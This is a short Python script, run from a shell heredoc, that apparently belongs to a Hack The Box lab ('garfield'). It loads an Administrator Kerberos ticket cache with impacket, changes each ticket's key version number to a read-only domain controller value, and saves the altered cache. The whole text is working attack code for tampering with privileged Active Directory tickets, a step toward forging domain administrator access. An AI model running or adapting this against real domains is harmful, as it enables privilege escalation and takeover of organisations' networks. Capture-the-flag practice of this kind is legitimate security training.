python3 << 'EOF'
from impacket.krb5.ccache import CCache
from impacket.krb5.asn1 import TGS_REP, AS_REP, Ticket, seq_set
from pyasn1.codec.der import decoder, encoder

ccache = CCache.loadFile('/htb/machines/garfield/Administrator.ccache')
rodc_kvno = (8245 << 16) | 3

for cred in ccache.credentials:
    # Decode the ticket from the credential
    tkt_data = cred.ticket.getData()
    ticket = decoder.decode(tkt_data, asn1Spec=Ticket())[0]
    
    # Get current kvno
    enc_part = ticket['enc-part']
    old_kvno = int(enc_part['kvno'])
    print(f"Old kvno: {old_kvno}")
    
    # Set RODC kvno
    enc_part['kvno'] = rodc_kvno
    print(f"New kvno: {rodc_kvno}")
    
    # Re-encode and save back
    new_tkt_data = encoder.encode(ticket)
    cred.ticket = CCache.Ticket()
    cred.ticket.fromData(new_tkt_data)

ccache.saveFile('/htb/machines/garfield/Administrator_rodc.ccache')
print("Saved Administrator_rodc.ccache with RODC kvno!")
EOF
